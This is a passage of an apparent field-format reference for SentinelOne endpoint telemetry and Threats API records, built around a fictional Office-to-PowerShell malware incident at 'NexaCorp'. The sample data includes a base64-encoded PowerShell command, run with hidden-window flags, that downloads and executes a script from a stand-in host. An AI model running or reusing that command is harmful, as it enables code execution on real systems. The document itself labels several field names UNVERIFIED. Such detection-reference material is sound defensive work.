SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=","src.process.image.path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","src.process.image.sha1":"efa6e7338129ccfad7989640b6ed01e3e0c0ffdc","src.process.user":"NEXACORP\\dana.levi","src.process.integrityLevel":"MEDIUM","src.process.storyline.id":"7C3A91E4B2D05F18","src.process.isStorylineRoot":false,"src.process.indicatorEvasionCount":1,"src.process.parent.name":"WINWORD.EXE","src.process.parent.pid":5216,"src.process.parent.uid":"7D3A91E4B2D05F18","src.process.parent.storyline.id":"7C3A91E4B2D05F18"}
```

(`indicator.name` value and the exact `indicator.description`/`indicator.metadata` text format are illustrative —
real values follow the pattern in the raw sample (`ServiceStarted`, description with `MITRE: <Tactic>{T…}`),
specific indicator names are **UNVERIFIED**.)

### 4.6 Threats API — one element of `data[]`

```json
{
  "id": "2318845712093384417",
  "agentDetectionInfo": {
    "accountId": "1876543210987654321",
    "accountName": "NexaCorp",
    "agentDetectionState": null,
    "agentDomain": "NEXACORP",
    "agentIpV4": "10.20.14.87",
    "agentIpV6": "fe80::5d1a:3c2b:9e4f:7a10",
    "agentLastLoggedInUpn": "dana.levi@nexacorp.com",
    "agentLastLoggedInUserMail": "dana.levi@nexacorp.com",
    "agentLastLoggedInUserName": "dana.levi",
    "agentMitigationMode": "protect",
    "agentOsName": "Windows 11 Enterprise",
    "agentOsRevision": "26100",
    "agentRegisteredAt": "2025-11-03T09:44:12.381204Z",
    "agentUuid": "8b3e5f2a9c1d4e7fb6a0c3d5e7f9a1b2",
    "agentVersion": "25.1.3.334",
    "cloudProviders": {},
    "externalIp": "213.57.121.34",
    "groupId": "1876543210987654512",
    "groupName": "Finance Workstations",
    "siteId": "1876543210987654400",
    "siteName": "TLV-HQ"
  },
  "agentRealtimeInfo": {
    "accountId": "1876543210987654321",
    "accountName": "NexaCorp",
    "activeThreats": 1,
    "agentComputerName": "FIN-WS-0142",
    "agentDecommissionedAt": null,
    "agentDomain": "NEXACORP",
    "agentId": "1876543210987661207",
    "agentInfected": true,
    "agentIsActive": true,
    "agentIsDecommissioned": false,
    "agentMachineType": "laptop",
    "agentMitigationMode": "protect",
    "agentNetworkStatus": "connected",
    "agentOsName": "Windows 11 Enterprise",
    "agentOsRevision": "26100",
    "agentOsType": "windows",
    "agentUuid": "8b3e5f2a9c1d4e7fb6a0c3d5e7f9a1b2",
    "agentVersion": "25.1.3.334",
    "groupId": "1876543210987654512",
    "groupName": "Finance Workstations",
    "networkInterfaces": [{"id": "1876543210987661300", "inet": ["10.20.14.87"], "inet6": ["fe80::5d1a:3c2b:9e4f:7a10"], "name": "Ethernet", "physical": "3C:52:82:A1:6F:0D"}],
    "operationalState": "na",
    "rebootRequired": false,
    "scanAbortedAt": null,
    "scanFinishedAt": "2026-09-27T02:41:09.553120Z",
    "scanStartedAt": "2026-09-27T02:03:55.104871Z",
    "scanStatus": "finished",
    "siteId": "1876543210987654400",
    "siteName": "TLV-HQ",
    "storageName": null,
    "storageType": null,
    "userActionsNeeded": []
  },
  "containerInfo": {"id": null, "image": null, "labels": null, "name": null},
  "indicators": [
    {"category": "Evasion", "description": "Encoded PowerShell command line was executed", "ids": [389], "tactics": [{"name": "Defense Evasion", "source": "MITRE", "techniques": [{"link": "https://attack.mitre.org/techniques/T1027/", "name": "T1027"}]}]},
    {"category": "Exploitation", "description": "Office program spawned a script interpreter", "ids": [62], "tactics": [{"name": "Execution", "source": "MITRE", "techniques": [{"link": "https://attack.mitre.org/techniques/T1059/001/", "name": "T1059.001"}]}, {"name": "Initial Access", "source": "MITRE", "techniques": [{"link": "https://attack.mitre.org/techniques/T1566/001/", "name": "T1566.001"}]}]},
    {"category": "General", "description": "Process dropped an unsigned executable to a hidden folder", "ids": [171], "tactics": []}
  ],
  "kubernetesInfo": {"cluster": null, "controllerKind": null, "controllerLabels": null, "controllerName": null, "namespace": null, "namespaceLabels": null, "node": null, "pod": null, "podLabels": null},
  "mitigationStatus": [
    {"action": "kill", "actionsCounters": {"failed": 0, "notFound": 0, "pendingReboot": 0, "success": 2, "total": 2}, "agentSupportsReport": true, "groupNotFound": false, "lastUpdate": "2026-09-29T08:14:27.118342Z", "latestReport": null, "mitigationEndedAt": "2026-09-29T08:14:27.051000Z", "mitigationStartedAt": "2026-09-29T08:14:26.903000Z", "status": "success"},
    {"action": "quarantine", "actionsCounters": {"failed": 0, "notFound": 0, "pendingReboot": 0, "success": 1, "total": 1}, "agentSupportsReport": true, "groupNotFound": false, "lastUpdate": "2026-09-29T08:14:27.402911Z", "latestReport": "/threats/mitigation-report", "mitigationEndedAt": "2026-09-29T08:14:27.380000Z", "mitigationStartedAt": "2026-09-29T08:14:27.060000Z", "status": "success"}
  ],
  "threatInfo": {
    "analystVerdict": "undefined",
    "analystVerdictDescription": "Undefined",
    "automaticallyResolved": false,
    "browserType": null,
    "certificateId": "",
    "classification": "Trojan",
    "classificationSource": "Behavioral",
    "cloudFilesHashVerdict": "black",
    "collectionId": "2318845711968120334",
    "confidenceLevel": "malicious",
    "createdAt": "2026-09-29T08:14:26.774519Z",
    "detectionEngines": [{"key": "executables", "title": "Behavioral AI"}],
    "detectionType": "dynamic",
    "engines": ["Behavioral AI"],
    "externalTicketExists": false,
    "externalTicketId": null,
    "failedActions": false,
    "fileExtension": "EXE",
    "fileExtensionType": "Executable",
    "filePath": "\\Device\\HarddiskVolume3\\ProgramData\\Microsoft\\Update\\msupd.exe",
    "fileSize": 318464,
    "fileVerificationType": "NotSigned",
    "identifiedAt": "2026-09-29T08:14:26.512000Z",
    "incidentStatus": "unresolved",
    "incidentStatusDescription": "Unresolved",
    "initiatedBy": "agent_policy",
    "initiatedByDescription": "Agent Policy",
    "initiatingUserId": null,
    "initiatingUsername": null,
    "isFileless": false,
    "isValidCertificate": false,
    "maliciousProcessArguments": "-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=",
    "md5": null,
    "mitigatedPreemptively": false,
    "mitigationStatus": "mitigated",
    "mitigationStatusDescription": "Mitigated",
    "originatorProcess": "powershell.exe",
    "pendingActions": false,
    "processUser": "NEXACORP\\dana.levi",
    "publisherName": "",
    "reachedEventsLimit": false,
    "rebootRequired": false,
    "sha1": "25f6bb19be3498752f0665b33793b97780b82e0b",
    "sha256": null,
    "storyline": "7C3A91E4B2D05F18",
    "threatId": "2318845712093384417",
    "threatName": "msupd.exe",
    "updatedAt": "2026-09-29T08:14:27.410553Z"
  },
  "whiteningOptions": ["hash", "path", "browser"]
}
```

(`filePath` device-path form and `whiteningOptions` values beyond `hash` are **UNVERIFIED**; `sha256` is commonly
null on threats — SHA1 is S1's primary file hash.)

---

## 5. Investigation notes

- **Storyline** is the pivot: Threat `threatInfo.storyline` = telemetry `src.process.storyline.id` /
  `tgt.process.storyline.id`. In Event Search, `src.process.storyline.id = "7C3A91E4B2D05F18"` returns the whole chain
  (WINWORD → PowerShell → DNS → connection → file drop). A process that starts a new chain has
  `isStorylineRoot:true`.
- **Process identity**: `uid` (S1-unique) is the join key, not `pid`. Child `src.process.parent.uid` = parent's
  `src.process.uid`; in a Process Creation event the new process is `tgt.process.uid`, and later events of that
  process carry it as `src.process.uid` (and as `process.unique.key`).
- **Actor model**: `src.*` always performs the action; `tgt.*` is the object (process/file/registry); DNS may show the
  physical resolver as `osSrc.process.*` (svchost) while `src.process.*` is the logical requester.
- **Host**: `agent.uuid` / `endpoint.name` (telemetry) = `agentRealtimeInfo.agentUuid` / `agentComputerName` (threat).
- **Counters** on `src.process.*` (`netConnCount`, `indicatorEvasionCount`, …) let an analyst gauge how noisy a process
  was without running another query.
- **Console vocabulary**: *Incidents → Threats* (threat list, "Threat details", "Mitigation actions": Kill, Quarantine,
  Remediate, Rollback, Disconnect from network), *Event Search* / Deep Visibility, *Storyline* / "Process Graph",
  "Analyst Verdict", "Incident Status", *STAR* custom detection rules, *Purple AI*, *Singularity Data Lake*.

---

## 6. Common mistakes / fields that do NOT exist

- Writing telemetry as **nested** JSON (`{"src":{"process":{"cmdline":...}}}`) — the native export uses flat keys with
  literal dots.
- Mixing generations of names in one event:
  - Legacy DV query/API names (camelCase): `SrcProcName`, `SrcProcCmdLine`, `TgtFilePath`, `SrcProcStorylineId`,
    `AgentName`, `DstIP`, `DstPort`, `DNSRequest`, `EventType`, `ObjectType`. Current: `src.process.name`,
    `src.process.cmdline`, `tgt.file.path`, `src.process.storyline.id`, `endpoint.name`, `dst.ip.address`,
    `dst.port.number`, `event.dns.request`, `event.type`, `event.category`.
  - Legacy Cloud Funnel 1.0 (`{"event":{...},"meta":{"computer_name","agent_version","os_family","trace_id"}}`, event
    names `ProcessCreation`, `Tcpv4`, `Dns`, `FileCreation`) — don't emit `meta.computer_name` in a CF 2.0 event.
  - Older CF 2.0 packets show un-spaced `event.type` (`ProcessCreation`, `IPConnect`, `DNSUnresolved`); current form
    is spaced (`Process Creation`, `IP Connect`, `DNS Resolved`). Use the spaced form consistently.
- Keys that do NOT exist: `s1.threat_name`, `threat.name`, `sentinelone.threatName`, `event.process.name`,
  `process.command_line`, `destination.ip`, `host.name` (those are ECS/Elastic), `data.*` (Wazuh), `src.process.parentName`,
  `tgt.ip.address` (it is `dst.ip.address`), `src.process.commandLine`.
- Threat object: `threatInfo.severity` does not exist on the classic Threats API (severity is expressed via
  `confidenceLevel` + `classification`); `threatInfo.threatName` is the file name, not a malware family;
  `analystVerdict` enum values are snake_case (`true_positive`), not "True Positive" (that is `analystVerdictDescription`).
- Don't put `agentComputerName` at the top level of a threat — it lives in `agentRealtimeInfo`.
